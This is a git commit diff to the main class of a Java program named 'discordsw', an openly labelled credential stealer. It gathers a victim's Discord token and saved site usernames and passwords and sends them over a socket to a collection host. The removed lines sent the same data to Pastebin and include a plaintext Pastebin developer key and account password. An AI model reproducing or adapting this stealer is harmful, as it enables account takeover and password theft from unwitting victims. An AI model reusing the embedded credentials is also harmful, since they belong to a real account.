a237081aa86518a4fbbfa6777b8c5ddea543f1de
Mafrans <malte.kluft@gmail.com>
2017-09-06 18:48:52 +0200

    Finalize

--- Client/src/me/mafrans/discordsw/Main.java
+++ Client/src/me/mafrans/discordsw/Main.java
@@ -2,31 +2,40 @@ package me.mafrans.discordsw;
 
 import me.mafrans.discordsw.stealer.Data;
 import me.mafrans.discordsw.stealer.Stealer;
-import org.jpaste.pastebin.Pastebin;
-import org.jpaste.pastebin.PastebinLink;
-import org.jpaste.pastebin.PastebinPaste;
 
 import java.io.*;
+import java.net.InetAddress;
+import java.net.Socket;
 import java.util.List;
 
 public class Main {
+    private static Socket socket;
+
     public static void main(String[] b) {
         try {
+            String host = "localhost";
+            int port = 25000;
+            socket = new Socket(host, port);
+
+            OutputStream os = socket.getOutputStream();
+            OutputStreamWriter osw = new OutputStreamWriter(os);
+            BufferedWriter bw = new BufferedWriter(osw);
+
+
             List<Data> dataList = Stealer.steal();
 
             StringBuilder builder = new StringBuilder();
-            builder.append("Token: " + Discord.getToken() + "\n\n\n");
+            builder.append("Token: " + Discord.getToken().replace(" ", "") + "||||||");
             for(Data data : dataList) {
-                builder.append(data.siteURL + ":\n");
-                builder.append("Username: " + data.username + "\n");
-                builder.append("Password: " + data.password + "\n\n");
+                builder.append(data.siteURL + ":||");
+                builder.append("Username: " + data.username + "||");
+                builder.append("Password: " + data.password + "||||");
             }
 
-            String devKey = "bf087793e4e2e36555dcfc1c212d192a";
-
-            PastebinManager.authenticateUser(devKey, "Nafrans", "SMrxwN3CdKpH");
-            PastebinLink link = PastebinManager.postPrivate("DiscordSW output", "this is a test post");
-            System.out.println("Output pasted into " + link.getLink().toString());
+            bw.write(builder.toString());
+            System.out.println(builder.toString());
+            bw.flush();
+            socket.close();
         }
         catch (Exception e) {
             e.printStackTrace();
